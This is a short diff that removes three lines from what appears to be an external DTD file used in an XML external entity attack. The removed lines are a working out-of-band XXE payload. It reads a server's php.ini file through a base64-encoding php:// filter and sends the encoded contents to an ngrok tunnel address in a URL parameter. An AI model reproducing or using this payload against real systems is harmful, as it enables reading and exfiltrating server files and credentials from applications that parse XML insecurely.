@@ -1,3 +1,0 @@
-<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/etc/php/5.5.9/cli/php.ini">
-
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://0.tcp.eu.ngrok.io:11889/?x=%d;'>"> 
